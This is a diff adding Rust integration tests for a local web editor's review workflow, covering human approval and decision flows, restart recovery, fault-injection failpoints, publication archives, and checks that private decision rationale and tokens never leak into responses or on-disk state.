@@ -3,6 +3,10 @@ use axum::body::to_bytes;
 use axum::http::Request;
 use serde_json::Value;
 use std::io::Read;
+use synapse_artifact_journal::{
+    ReviewId as JournalReviewId, ReviewState as JournalReviewState, SqliteReviewJournal,
+};
+use synapse_core::Repository as SynapseRepository;
 use tempfile::TempDir;
 use tower::ServiceExt;
 
@@ -55,6 +59,10 @@ impl Harness {
         post_for(&self.state, token, uri, payload).await
     }
 
+    async fn patch(&self, uri: &str, payload: Value) -> Response {
+        patch_for(&self.state, &self.token, uri, payload).await
+    }
+
     async fn get(&self, uri: &str) -> Response {
         editor_router(self.state.clone())
             .oneshot(
@@ -67,6 +75,32 @@ impl Harness {
             )
             .await
             .expect("response")
+    }
+
+    async fn restart(self) -> Self {
+        let Self {
+            _root,
+            _import,
+            state,
+            token: _,
+        } = self;
+        drop(state);
+        let config = ServerConfig::new(
+            EDITOR_ORIGIN,
+            EDITOR_HOST,
+            PREVIEW_ORIGIN,
+            _root.path(),
+            _root.path().join("missing-web-dist"),
+        )
+        .with_import_root(_import.as_ref().map(|source| source.path().to_path_buf()));
+        let state = StudioState::new(config).expect("restarted state");
+        let token = bootstrap_token(&state).await;
+        Self {
+            _root,
+            _import,
+            state,
+            token,
+        }
     }
 }
 
@@ -82,6 +116,44 @@ async fn post_for(state: &StudioState, token: &str, uri: &str, payload: Value) -
                 .header(CONTENT_TYPE, "application/json")
                 .header(AUTHORIZATION, format!("Bearer {token}"))
                 .body(Body::from(serde_json::to_vec(&payload).expect("json")))
+                .expect("request"),
+        )
+        .await
+        .expect("response")
+}
+
+async fn patch_for(state: &StudioState, token: &str, uri: &str, payload: Value) -> Response {
+    editor_router(state.clone())
+        .oneshot(
+            Request::builder()
+                .method("PATCH")
+                .uri(uri)
+                .header(HOST, EDITOR_HOST)
+                .header(ORIGIN, EDITOR_ORIGIN)
+                .header("sec-fetch-site", "same-origin")
+                .header(CONTENT_TYPE, "application/json")
+                .header(AUTHORIZATION, format!("Bearer {token}"))
+                .body(Body::from(serde_json::to_vec(&payload).expect("json")))
+                .expect("request"),
+        )
+        .await
+        .expect("response")
+}
+
+async fn raw_patch_for(
+    state: &StudioState,
+    uri: &str,
+    payload: &Value,
+    headers: &[(&str, &str)],
+) -> Response {
+    let mut request = Request::builder().method("PATCH").uri(uri);
+    for (name, value) in headers {
+        request = request.header(*name, *value);
+    }
+    editor_router(state.clone())
+        .oneshot(
+            request
+                .body(Body::from(serde_json::to_vec(payload).expect("json")))
                 .expect("request"),
         )
         .await
@@ -366,12 +438,162 @@ async fn create_blank_fake_proposal(
     )
 }
 
+async fn create_fake_proposal_for_project(
+    harness: &Harness,
+    project_id: &str,
+    revision_id: &str,
+    seed: u128,
+) -> Value {
+    let target = harness
+        .post(
+            &format!("/api/v1/projects/{project_id}/targets"),
+            element_target_request(revision_id, seed, "hero-heading"),
+        )
+        .await;
+    assert_eq!(target.status(), StatusCode::CREATED);
+    let target = response_json(target).await;
+    let context = harness
+        .post(
+            &format!("/api/v1/projects/{project_id}/contexts"),
+            context_request(revision_id, &target, "見出しを変更してください。"),
+        )
+        .await;
+    assert_eq!(context.status(), StatusCode::CREATED);
+    let context = response_json(context).await;
+    let proposal = harness
+        .post(
+            &format!("/api/v1/projects/{project_id}/proposals"),
+            json!({
+                "schemaVersion":"1",
+                "contextId":string_at(&context, "/context/id"),
+                "contextSha256":string_at(&context, "/context/sha256")
+            }),
+        )
+        .await;
+    let status = proposal.status();
+    let proposal = response_json(proposal).await;
+    assert_eq!(
+        status,
+        StatusCode::CREATED,
+        "proposal seed {seed}: {proposal:#}"
+    );
+    proposal
+}
+
+async fn prepare_faulted_decision(
+    harness: &Harness,
+    disposition: &str,
+    seed: u128,
+) -> (String, String, String, Value) {
+    let (project_id, revision_id, proposal_id, review_id) =
+        create_blank_fake_proposal(harness, seed).await;
+    let intent_id = format!("fault-matrix-{seed}");
+    let approval = harness
+        .post(
+            &format!("/api/v1/reviews/{review_id}/approvals"),
+            json!({
+                "schemaVersion":"1",
+                "proposalId":proposal_id,
+                "expectedRevisionId":revision_id,
+                "disposition":disposition,
+                "intentId":intent_id
+            }),
+        )
+        .await;
+    assert_eq!(approval.status(), StatusCode::CREATED);
+    let approval_token = string_at(&response_json(approval).await, "/approval/token");
+    let request = json!({
+        "schemaVersion":"1",
+        "approvalToken":approval_token,
+        "proposalId":proposal_id,
+        "expectedRevisionId":revision_id,
+        "disposition":disposition,
+        "intentId":intent_id,
+        "rationale":"fault matrix private rationale"
+    });
+    (project_id, revision_id, review_id, request)
+}
+
+fn transition_review_to_terminal_denial(
+    harness: &Harness,
+    project_id: &str,
+    review_id: &str,
+) -> (String, String) {
+    let (repository_path, journal_path) = harness
+        .state
+        .storage()
+        .unwrap()
+        .synapse_paths(project_id)
+        .unwrap();
+    let review_id = JournalReviewId::parse(review_id.to_owned()).unwrap();
+    let mut journal = SqliteReviewJournal::open(journal_path).unwrap();
+    let review = journal.get_review(&review_id).unwrap();
+    let proposal_ref = review.binding().proposal_ref_name().to_owned();
+    let proposal_head = review.binding().proposal_head().to_owned();
+    assert_eq!(review.state(), JournalReviewState::PendingReview);
+    assert_eq!(
+        journal
+            .transition_review_state(
+                &review_id,
+                JournalReviewState::PendingReview,
+                JournalReviewState::TerminalDenial,
+            )
+            .unwrap()
+            .state(),
+        JournalReviewState::TerminalDenial
+    );
+    let repository = SynapseRepository::open(repository_path).unwrap();
+    assert_eq!(
+        repository.refs().get(&proposal_ref).unwrap().unwrap().head,
+        proposal_head
+    );
+    (proposal_ref, proposal_head)
+}
+
+async fn reconcile_and_cleanup_failed_proposal(
+    harness: &Harness,
+    project_id: &str,
+    proposal_id: &str,
+    review_id: &str,
+) {
+    let reconciled = harness
+        .post(
+            &format!("/api/v1/operations/reviews/{review_id}/reconcile"),
+            json!({"schemaVersion":"1"}),
+        )
+        .await;
+    assert_eq!(reconciled.status(), StatusCode::OK);
+    assert_eq!(
+        response_json(reconciled).await["review"]["status"],
+        "failed"
+    );
+
+    let cleanup = harness
+        .post(
+            "/api/v1/retention/cleanup",
+            json!({
+                "schemaVersion":"1",
+                "scope":"failed_proposal",
+                "projectId":project_id,
+                "proposalId":proposal_id,
+                "reviewId":review_id,
+                "confirmation":proposal_id
+            }),
+        )
+        .await;
+    assert_eq!(cleanup.status(), StatusCode::OK);
+    assert_eq!(
+        response_json(cleanup).await["removed"]["scope"],
+        "failed_proposal"
+    );
+}
+
 #[tokio::test]
 async fn complete_real_synapsegit_flow_adopts_only_after_one_shot_approval() {
     // Production proposal creation is serialized by the single Store mutex.
     // Mirror that boundary across otherwise-independent test StudioState values.
     let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
-    let harness = Harness::new().await;
+    let mut harness = Harness::new().await;
     let create = harness
         .post(
             "/api/v1/projects",
@@ -675,6 +897,39 @@ async fn complete_real_synapsegit_flow_adopts_only_after_one_shot_approval() {
     .await;
     assert_eq!(first_zip, second_zip);
 
+    let publication = harness
+        .post(
+            &format!("/api/v1/projects/{project_id}/publications"),
+            json!({
+                "schemaVersion":"1",
+                "revisionId":adopted_revision,
+                "publicLabel":"Example LP",
+                "title":"Reviewed landing page",
+                "summary":"A local-only publication projection for review.",
+                "publicDecisionNote":"Approved for this local draft."
+            }),
+        )
+        .await;
+    assert_eq!(publication.status(), StatusCode::CREATED);
+    let publication = response_json(publication).await;
+    assert_eq!(publication["publication"]["networkWrites"], false);
+    assert_eq!(
+        publication["publication"]["remotePublication"],
+        "separate_human_action"
+    );
+    let publication_url = string_at(&publication, "/publication/downloadUrl");
+    let publication_zip = response_bytes(harness.get(&publication_url).await).await;
+
+    harness = harness.restart().await;
+    assert_eq!(
+        response_bytes(harness.get(&first_url).await).await,
+        first_zip
+    );
+    assert_eq!(
+        response_bytes(harness.get(&publication_url).await).await,
+        publication_zip
+    );
+
     let mut archive = zip::ZipArchive::new(Cursor::new(first_zip)).unwrap();
     assert_eq!(archive.len(), 2);
     assert_eq!(archive.by_index(0).unwrap().name(), "index.html");
@@ -689,6 +944,941 @@ async fn complete_real_synapsegit_flow_adopts_only_after_one_shot_approval() {
     assert!(!index.contains("synapsegit-lp.selection"));
     assert!(!index.contains("synapsegit-lp.diagnostic"));
     assert!(!index.contains("window.name=\"\""));
+}
+
+#[tokio::test]
+async fn publication_prefers_the_active_proposal_over_older_terminal_history() {
+    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
+    let harness = Harness::new().await;
+    let (project_id, revision_id, review_id, decision_request) =
+        prepare_faulted_decision(&harness, "rejected", 1_900).await;
+    let decision = harness
+        .post(
+            &format!("/api/v1/reviews/{review_id}/decisions"),
+            decision_request,
+        )
+        .await;
+    assert_eq!(decision.status(), StatusCode::OK);
+    assert_eq!(
+        response_json(decision).await["decision"]["disposition"],
+        "rejected"
+    );
+
+    let active = create_fake_proposal_for_project(&harness, &project_id, &revision_id, 1_901).await;
+    let active_manifest = string_at(&active, "/proposal/artifactManifestSha256");
+    let publication = harness
+        .post(
+            &format!("/api/v1/projects/{project_id}/publications"),
+            json!({
+                "schemaVersion":"1",
+                "revisionId":revision_id,
+                "publicLabel":"Current review",
+                "title":"Active proposal truth",
+                "summary":"The current incomplete session must outrank older terminal history."
+            }),
+        )
+        .await;
+    assert_eq!(publication.status(), StatusCode::CREATED);
+    let publication = response_json(publication).await;
+    let archive_bytes = response_bytes(
+        harness
+            .get(string_at(&publication, "/publication/downloadUrl").as_str())
+            .await,
+    )
+    .await;
+    let mut archive = zip::ZipArchive::new(Cursor::new(archive_bytes)).unwrap();
+    let mut projection_bytes = Vec::new();
+    archive
+        .by_name("projection.json")
+        .unwrap()
+        .read_to_end(&mut projection_bytes)
+        .unwrap();
+    let projection: Value = serde_json::from_slice(&projection_bytes).unwrap();
+
+    assert_eq!(projection["session"]["completeness"]["state"], "incomplete");
+    assert_eq!(
+        projection["session"]["completeness"]["incompleteReason"],
+        "proposal_pending"
+    );
+    assert_eq!(
+        projection["session"]["proposal"]["manifestSha256"]["value"],
+        active_manifest
+    );
+    assert!(projection["session"]["humanDecision"].is_null());
+}
+
+#[tokio::test]
+async fn private_decision_memo_is_absent_from_the_entire_managed_state_tree() {
+    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
+    let harness = Harness::new().await;
+    let (_project_id, _revision_id, review_id, mut decision_request) =
+        prepare_faulted_decision(&harness, "adopted_unchanged", 1_902).await;
+    let private_canary = "RAW_PRIVATE_MEMO_STATE_ROOT_CANARY_7c41_keep_ephemeral";
+    decision_request["rationale"] = json!(private_canary);
+    let decision = harness
+        .post(
+            &format!("/api/v1/reviews/{review_id}/decisions"),
+            decision_request,
+        )
+        .await;
+    assert_eq!(decision.status(), StatusCode::OK);
+
+    for (path, bytes) in source_fingerprint(harness._root.path()) {
+        assert!(
+            !bytes
+                .windows(private_canary.len())
+                .any(|window| window == private_canary.as_bytes()),
+            "private Decision memo persisted at {path}"
+        );
+    }
+}
+
+#[tokio::test]
+async fn pending_reviews_and_all_terminal_decisions_rehydrate_across_restart() {
+    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
+    for (index, disposition) in ["adopted_unchanged", "rejected", "deferred"]
+        .into_iter()
+        .enumerate()
+    {
+        let harness = Harness::new().await;
+        let (project_id, base_revision_id, proposal_id, review_id) =
+            create_blank_fake_proposal(&harness, 2_000 + index as u128).await;
+        let harness = harness.restart().await;
+
+        let project =
+            response_json(harness.get(&format!("/api/v1/projects/{project_id}")).await).await;
+        assert_eq!(project["project"]["activeReview"]["reviewId"], review_id);
+        assert_eq!(
+            project["project"]["activeReview"]["proposalId"],
+            proposal_id
+        );
+        assert_eq!(
+            project["project"]["activeReview"]["status"],
+            "pending_review"
+        );
+        assert_eq!(project["project"]["history"], json!([]));
+
+        let pending_review =
+            response_json(harness.get(&format!("/api/v1/reviews/{review_id}")).await).await;
+        assert_eq!(pending_review["review"]["proposalId"], proposal_id);
+        assert_eq!(pending_review["review"]["status"], "pending_review");
+        assert_eq!(pending_review["review"]["reconciliationRequired"], false);
+        assert_eq!(pending_review["review"]["decision"], Value::Null);
+        assert_eq!(
+            pending_review["review"]["proposal"]["target"]["captureRevisionId"],
+            base_revision_id
+        );
+        assert_eq!(
+            pending_review["review"]["proposal"]["targetResolution"]["status"],
+            "resolved"
+        );
+        assert_eq!(
+            pending_review["review"]["proposal"]["instruction"],
+            "見出しを変更してください。"
+        );
+
+        let intent_id = format!("restart-terminal-{index}");
+        let approval = harness
+            .post(
+                &format!("/api/v1/reviews/{review_id}/approvals"),
+                json!({
+                    "schemaVersion":"1",
+                    "proposalId":proposal_id,
+                    "expectedRevisionId":base_revision_id,
+                    "disposition":disposition,
+                    "intentId":intent_id
+                }),
+            )
+            .await;
+        assert_eq!(approval.status(), StatusCode::CREATED);
+        let approval_token = string_at(&response_json(approval).await, "/approval/token");
+        let decision = harness
+            .post(
+                &format!("/api/v1/reviews/{review_id}/decisions"),
+                json!({
+                    "schemaVersion":"1",
+                    "approvalToken":approval_token,
+                    "proposalId":proposal_id,
+                    "expectedRevisionId":base_revision_id,
+                    "disposition":disposition,
+                    "intentId":intent_id,
+                    "rationale":"restart integration review"
+                }),
+            )
+            .await;
+        assert_eq!(decision.status(), StatusCode::OK);
+        let decision = response_json(decision).await;
+        let resulting_revision_id = string_at(&decision, "/project/revisionId");
+        let resulting_manifest = string_at(&decision, "/project/acceptedManifestSha256");
+        if disposition == "adopted_unchanged" {
+            assert_ne!(resulting_revision_id, base_revision_id);
+        } else {
+            assert_eq!(resulting_revision_id, base_revision_id);
+        }
+
+        let terminal =
+            response_json(harness.get(&format!("/api/v1/reviews/{review_id}")).await).await;
+        assert_eq!(
+            terminal["review"]["status"],
+            match disposition {
+                "adopted_unchanged" => "adopted",
+                "rejected" => "rejected",
+                "deferred" => "deferred",
+                _ => unreachable!(),
+            }
+        );
+        assert_eq!(terminal["review"]["proposal"], Value::Null);
+        assert_eq!(terminal["review"]["decision"]["proposalId"], proposal_id);
+        assert_eq!(
+            terminal["review"]["decision"]["artifactManifestSha256"],
+            resulting_manifest
+        );
+
+        let harness = harness.restart().await;
+        let rehydrated =
+            response_json(harness.get(&format!("/api/v1/projects/{project_id}")).await).await;
+        assert_eq!(rehydrated["project"]["activeReview"], Value::Null);
+        assert_eq!(
+            rehydrated["project"]["history"].as_array().unwrap().len(),
+            1
+        );
+        assert_eq!(
+            rehydrated["project"]["history"][0]["resultingAcceptedManifestSha256"],
+            resulting_manifest
+        );
+        assert_eq!(rehydrated["project"]["revisionId"], resulting_revision_id);
+
+        let reconciled = harness
+            .post(
+                &format!("/api/v1/operations/reviews/{review_id}/reconcile"),
+                json!({"schemaVersion":"1"}),
+            )
+            .await;
+        assert_eq!(reconciled.status(), StatusCode::OK);
+        let reconciled = response_json(reconciled).await;
+        assert_eq!(reconciled["review"]["proposal"], Value::Null);
+        assert_eq!(
+            reconciled["review"]["decision"]["artifactManifestSha256"],
+            resulting_manifest
+        );
+    }
+}
+
+#[tokio::test]
+async fn startup_reconciles_a_core_decision_committed_before_local_receipt_or_pointer() {
+    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
+    for (index, disposition) in [
+        DispositionDto::AdoptedUnchanged,
+        DispositionDto::Rejected,
+        DispositionDto::Deferred,
+    ]
+    .into_iter()
+    .enumerate()
+    {
+        let harness = Harness::new().await;
+        let (project_id, base_revision_id, proposal_id, review_id) =
+            create_blank_fake_proposal(&harness, 2_100 + index as u128).await;
+        let (project_snapshot, proposal_snapshot) = {
+            let store = harness.state.store().unwrap();
+            let project = store.projects.get(&project_id).unwrap();
+            (
+                project.id.clone(),
+                project.proposal.as_ref().unwrap().clone(),
+            )
+        };
+        let sidecar = {
+            let store = harness.state.store().unwrap();
+            let project = store.projects.get(&project_id).unwrap();
+            open_runtime_sidecar(&harness.state, project, &proposal_snapshot).unwrap()
+        };
+        let outcome = sidecar
+            .decide(
+                &review_id,
+                disposition.artifact(),
+                Some("simulated crash after Core Decision"),
+                format!("core-before-local-{index}").as_bytes(),
+            )
+            .unwrap();
+        assert!(matches!(outcome, ReviewOutcome::DecisionCommitted(_)));
+        assert_eq!(project_snapshot, project_id);
+        {
+            let store = harness.state.store().unwrap();
+            let project = store.projects.get(&project_id).unwrap();
+            assert_eq!(project.revision_id, base_revision_id);
+            assert!(project.history.is_empty());
+            assert_eq!(project.proposal.as_ref().unwrap().id, proposal_id);
+        }
+
+        let harness = harness.restart().await;
+        let project =
+            response_json(harness.get(&format!("/api/v1/projects/{project_id}")).await).await;
+        assert_eq!(project["project"]["activeReview"], Value::Null);
+        assert_eq!(project["project"]["history"].as_array().unwrap().len(), 1);
+        assert_eq!(
+            project["project"]["history"][0]["disposition"],
+            match disposition {
+                DispositionDto::AdoptedUnchanged => "adopted_unchanged",
+                DispositionDto::Rejected => "rejected",
+                DispositionDto::Deferred => "deferred",
+            }
+        );
+        if disposition == DispositionDto::AdoptedUnchanged {
+            assert_ne!(project["project"]["revisionId"], base_revision_id);
+        } else {
+            assert_eq!(project["project"]["revisionId"], base_revision_id);
+        }
+        let terminal =
+            response_json(harness.get(&format!("/api/v1/reviews/{review_id}")).await).await;
+        assert_eq!(
+            terminal["review"]["decision"]["artifactManifestSha256"],
+            project["project"]["acceptedManifestSha256"]
+        );
+    }
+}
+
+#[tokio::test]
+async fn sequential_reviews_survive_restart_and_defer_creates_a_derived_proposal() {
+    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
+    let mut harness = Harness::new().await;
+    let created = response_json(
+        harness
+            .post(
+                "/api/v1/projects",
+                json!({"schemaVersion":"1","template":"blank"}),
+            )
+            .await,
+    )
+    .await;
+    let project_id = string_at(&created, "/project/id");
+    let mut revision_id = string_at(&created, "/project/revisionId");
+    let initial_revision_id = revision_id.clone();
+    let mut deferred_proposal_id: Option<String> = None;
+
+    for (index, disposition) in ["rejected", "deferred", "adopted_unchanged"]
+        .into_iter()
+        .enumerate()
+    {
+        let proposal = create_fake_proposal_for_project(
+            &harness,
+            &project_id,
+            &revision_id,
+            2_200 + index as u128,
+        )
+        .await;
+        let proposal_id = string_at(&proposal, "/proposal/id");
+        let review_id = string_at(&proposal, "/proposal/reviewId");
+        if index == 2 {
+            assert_eq!(
+                proposal["proposal"]["derivedFromProposalId"],
+                deferred_proposal_id.as_deref().unwrap()
+            );
+        } else {
+            assert_eq!(proposal["proposal"].get("derivedFromProposalId"), None);
+        }
+        let intent_id = format!("sequential-review-{index}");
+        let approval = harness
+            .post(
+                &format!("/api/v1/reviews/{review_id}/approvals"),
+                json!({
+                    "schemaVersion":"1",
+                    "proposalId":proposal_id,
+                    "expectedRevisionId":revision_id,
+                    "disposition":disposition,
+                    "intentId":intent_id
+                }),
+            )
+            .await;
+        assert_eq!(approval.status(), StatusCode::CREATED);
+        let approval_token = string_at(&response_json(approval).await, "/approval/token");
+        let decision = harness
+            .post(
+                &format!("/api/v1/reviews/{review_id}/decisions"),
+                json!({
+                    "schemaVersion":"1",
+                    "approvalToken":approval_token,
+                    "proposalId":proposal_id,
+                    "expectedRevisionId":revision_id,
+                    "disposition":disposition,
+                    "intentId":intent_id,
+                    "rationale":"sequential restart test"
+                }),
+            )
+            .await;
+        assert_eq!(decision.status(), StatusCode::OK);
+        let decision = response_json(decision).await;
+        revision_id = string_at(&decision, "/project/revisionId");
+        if disposition == "deferred" {
+            deferred_proposal_id = Some(proposal_id);
+        }
+        harness = harness.restart().await;
+    }
+
+    assert_ne!(revision_id, initial_revision_id);
+    let project = response_json(harness.get(&format!("/api/v1/projects/{project_id}")).await).await;
+    assert_eq!(project["project"]["history"].as_array().unwrap().len(), 3);
+    assert_eq!(project["project"]["history"][0]["disposition"], "rejected");
+    assert_eq!(project["project"]["history"][1]["disposition"], "deferred");
+    assert_eq!(
+        project["project"]["history"][2]["disposition"],
+        "adopted_unchanged"
+    );
+    assert_eq!(project["project"]["revisionId"], revision_id);
+}
+
+#[tokio::test]
+async fn every_decision_failpoint_recovers_without_a_split_brain() {
+    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
+    for (index, failpoint) in fault_injection::Failpoint::ALL.into_iter().enumerate() {
+        let harness = Harness::new().await;
+        let (project_id, base_revision_id, review_id, request) =
+            prepare_faulted_decision(&harness, "adopted_unchanged", 3_000 + index as u128).await;
+        let approval_token = request["approvalToken"].as_str().unwrap().to_owned();
+        let state_root = harness._root.path().to_string_lossy().into_owned();
+        let response_body;
+        {
+            let _scenario = fault_injection::testing::Scenario::begin();
+            fault_injection::testing::fail_next(failpoint);
+            let response = harness
+                .post(
+                    &format!("/api/v1/reviews/{review_id}/decisions"),
+                    request.clone(),
+                )
+                .await;
+            response_body = String::from_utf8(response_bytes(response).await).unwrap();
+            assert!(
+                fault_injection::testing::hit_count(failpoint) > 0,
+                "{} was not reached",
+                failpoint.name()
+            );
+            assert!(!response_body.contains("fault matrix private rationale"));
+            assert!(!response_body.contains(&approval_token));
+            assert!(!response_body.contains(&state_root));
+        }
+
+        let harness = harness.restart().await;
+        let project =
+            response_json(harness.get(&format!("/api/v1/projects/{project_id}")).await).await;
+        let failed_before_intent = matches!(
+            failpoint,
+            fault_injection::Failpoint::DecisionObjectWriteBefore
+                | fault_injection::Failpoint::DecisionObjectWriteAfter
+                | fault_injection::Failpoint::DecisionJournalIntentBefore
+        );
+        if failed_before_intent {
+            assert_eq!(project["project"]["revisionId"], base_revision_id);
+            assert_eq!(project["project"]["history"].as_array().unwrap().len(), 0);
+            assert_eq!(
+                project["project"]["activeReview"]["status"],
+                "pending_review"
+            );
+        } else {
+            assert_ne!(project["project"]["revisionId"], base_revision_id);
+            assert_eq!(project["project"]["history"].as_array().unwrap().len(), 1);
+            assert!(project["project"]["activeReview"].is_null());
+            let review =
+                response_json(harness.get(&format!("/api/v1/reviews/{review_id}")).await).await;
+            assert_eq!(review["review"]["status"], "adopted");
+            assert_eq!(review["review"]["reconciliationRequired"], false);
+        }
+    }
+}
+
+#[tokio::test]
+async fn post_decision_faults_never_claim_accepted_state_is_unchanged() {
+    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
+    let failpoints = [
+        fault_injection::Failpoint::DecisionSynapseCallBefore,
+        fault_injection::Failpoint::DecisionReceiptPersistAfter,
+        fault_injection::Failpoint::DecisionMaterializeBefore,
+        fault_injection::Failpoint::DecisionJournalCompleteBefore,
+        fault_injection::Failpoint::DecisionResponseBefore,
+    ];
+    for (index, failpoint) in failpoints.into_iter().enumerate() {
+        let harness = Harness::new().await;
+        let (_, _, review_id, request) =
+            prepare_faulted_decision(&harness, "adopted_unchanged", 3_050 + index as u128).await;
+        let _scenario = fault_injection::testing::Scenario::begin();
+        fault_injection::testing::fail_next(failpoint);
+        let response = harness
+            .post(&format!("/api/v1/reviews/{review_id}/decisions"), request)
+            .await;
+        assert!(!response.status().is_success(), "{}", failpoint.name());
+        assert!(
+            fault_injection::testing::hit_count(failpoint) > 0,
+            "{} was not reached",
+            failpoint.name()
+        );
+        let request_id = response
+            .headers()
+            .get("x-request-id")
+            .unwrap()
+            .to_str()
+            .unwrap()
+            .to_owned();
+        let operation_id = response
+            .headers()
+            .get("x-operation-id")
+            .unwrap()
+            .to_str()
+            .unwrap()
+            .to_owned();
+        let body = response_json(response).await;
+        assert!(
+            matches!(
+                body["error"]["code"].as_str(),
+                Some("decision_reconciliation_required" | "decision_outcome_unknown")
+            ),
+            "{}: {body:#}",
+            failpoint.name()
+        );
+        assert_eq!(body["error"]["requestId"], request_id);
+        assert_eq!(body["error"]["operationId"], operation_id);
+        assert_eq!(
+            body["error"]["detail"],
+            json!({
+                "acceptedState":"reconciliation_required",
+                "recoveryAction":"reconcile"
+            })
+        );
+        assert_ne!(body["error"]["detail"]["acceptedState"], "unchanged");
+        assert!(
+            !serde_json::to_string(&body)
+                .unwrap()
+                .contains("fault matrix private rationale")
+        );
+    }
+}
+
+#[tokio::test]
+async fn successful_adoption_reaches_the_documented_failpoint_occurrence_profile() {
+    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
+    let harness = Harness::new().await;
+    let (_, _, review_id, request) =
+        prepare_faulted_decision(&harness, "adopted_unchanged", 3_099).await;
+    let _scenario = fault_injection::testing::Scenario::begin();
+    let response = harness
+        .post(&format!("/api/v1/reviews/{review_id}/decisions"), request)
+        .await;
+    assert_eq!(response.status(), StatusCode::OK);
+    for failpoint in fault_injection::Failpoint::ALL {
+        assert_eq!(
+            fault_injection::testing::hit_count(failpoint),
+            expected_adoption_occurrences(failpoint),
+            "the abort matrix must be updated when {} gains a durable occurrence",
+            failpoint.name()
+        );
+    }
+}
+
+const fn expected_adoption_occurrences(failpoint: fault_injection::Failpoint) -> u64 {
+    match failpoint {
+        fault_injection::Failpoint::DecisionObjectWriteBefore
+        | fault_injection::Failpoint::DecisionObjectWriteAfter
+        | fault_injection::Failpoint::DecisionReceiptQueryBefore
+        | fault_injection::Failpoint::DecisionReceiptQueryAfter => 2,
+        fault_injection::Failpoint::StorageWriteBefore
+        | fault_injection::Failpoint::StorageWriteAfter
+        | fault_injection::Failpoint::StorageRenameBefore
+        | fault_injection::Failpoint::StorageRenameAfter => 7,
+        fault_injection::Failpoint::StorageFsyncBefore
+        | fault_injection::Failpoint::StorageFsyncAfter => 14,
+        _ => 1,
+    }
+}
+
+#[tokio::test]
+async fn receipt_failure_recovery_preserves_each_human_disposition() {
+    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
+    for (index, disposition) in ["adopted_unchanged", "rejected", "deferred"]
+        .into_iter()
+        .enumerate()
+    {
+        let harness = Harness::new().await;
+        let (project_id, base_revision_id, review_id, request) =
+            prepare_faulted_decision(&harness, disposition, 3_100 + index as u128).await;
+        {
+            let _scenario = fault_injection::testing::Scenario::begin();
+            fault_injection::testing::fail_next(
+                fault_injection::Failpoint::DecisionReceiptPersistAfter,
+            );
+            let response = harness
+                .post(&format!("/api/v1/reviews/{review_id}/decisions"), request)
+                .await;
+            assert!(response.status().is_server_error());
+        }
+        let harness = harness.restart().await;
+        let project =
+            response_json(harness.get(&format!("/api/v1/projects/{project_id}")).await).await;
+        assert_eq!(project["project"]["history"].as_array().unwrap().len(), 1);
+        if disposition == "adopted_unchanged" {
+            assert_ne!(project["project"]["revisionId"], base_revision_id);
+        } else {
+            assert_eq!(project["project"]["revisionId"], base_revision_id);
+        }
+        let review =
+            response_json(harness.get(&format!("/api/v1/reviews/{review_id}")).await).await;
+        let expected_status = match disposition {
+            "adopted_unchanged" => "adopted",
+            "rejected" => "rejected",
+            "deferred" => "deferred",
+            _ => unreachable!(),
+        };
+        assert_eq!(review["review"]["status"], expected_status);
+    }
+}
+
+#[tokio::test]
+async fn storage_full_and_permission_failures_preserve_accepted_then_reconcile_forward() {
+    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
+    let cases = [
+        (
+            fault_injection::Failpoint::StorageWriteBefore,
+            fault_injection::InjectedFailureKind::StorageFull,
+        ),
+        (
+            fault_injection::Failpoint::StorageWriteAfter,
+            fault_injection::InjectedFailureKind::PermissionDenied,
+        ),
+        (
+            fault_injection::Failpoint::StorageFsyncBefore,
+            fault_injection::InjectedFailureKind::StorageFull,
+        ),
+        (
+            fault_injection::Failpoint::StorageFsyncAfter,
+            fault_injection::InjectedFailureKind::PermissionDenied,
+        ),
+        (
+            fault_injection::Failpoint::StorageRenameBefore,
+            fault_injection::InjectedFailureKind::StorageFull,
+        ),
+        (
+            fault_injection::Failpoint::StorageRenameAfter,
+            fault_injection::InjectedFailureKind::PermissionDenied,
+        ),
+    ];
+    for (index, (failpoint, kind)) in cases.into_iter().enumerate() {
+        let harness = Harness::new().await;
+        let (project_id, base_revision_id, review_id, request) =
+            prepare_faulted_decision(&harness, "adopted_unchanged", 3_150 + index as u128).await;
+        let root = harness._root.path().to_path_buf();
+        let project_root = root.join("managed-v1/projects").join(&project_id);
+        let current_before = std::fs::read(project_root.join("current.json")).unwrap();
+        let site_before = source_fingerprint(&project_root.join("site"));
+        let approval_token = request["approvalToken"].as_str().unwrap().to_owned();
+
+        let response_body;
+        {
+            let _scenario = fault_injection::testing::Scenario::begin();
+            fault_injection::testing::fail_on_kind(failpoint, 1, kind);
+            let response = harness
+                .post(&format!("/api/v1/reviews/{review_id}/decisions"), request)
+                .await;
+            assert_eq!(response.status(), StatusCode::SERVICE_UNAVAILABLE);
+            response_body = String::from_utf8(response_bytes(response).await).unwrap();
+            assert_eq!(fault_injection::testing::hit_count(failpoint), 1);
+        }
+        assert_eq!(
+            std::fs::read(project_root.join("current.json")).unwrap(),
+            current_before
+        );
+        assert_eq!(source_fingerprint(&project_root.join("site")), site_before);
+        for forbidden in [
+            "fault matrix private rationale",
+            approval_token.as_str(),
+            root.to_string_lossy().as_ref(),
+            "StorageFull",
+            "PermissionDenied",
+        ] {
+            assert!(
+                !response_body.contains(forbidden),
+                "unsafe diagnostic from {}",
+                failpoint.name()
+            );
+        }
+        assert!(response_body.contains("decision_reconciliation_required"));
+        assert!(response_body.contains("\"acceptedState\":\"reconciliation_required\""));
+        assert!(response_body.contains("\"recoveryAction\":\"reconcile\""));
+
+        let harness = harness.restart().await;
+        let project =
+            response_json(harness.get(&format!("/api/v1/projects/{project_id}")).await).await;
+        assert_ne!(project["project"]["revisionId"], base_revision_id);
+        assert_eq!(project["project"]["history"].as_array().unwrap().len(), 1);
+        assert!(project["project"]["activeReview"].is_null());
+        let review =
+            response_json(harness.get(&format!("/api/v1/reviews/{review_id}")).await).await;
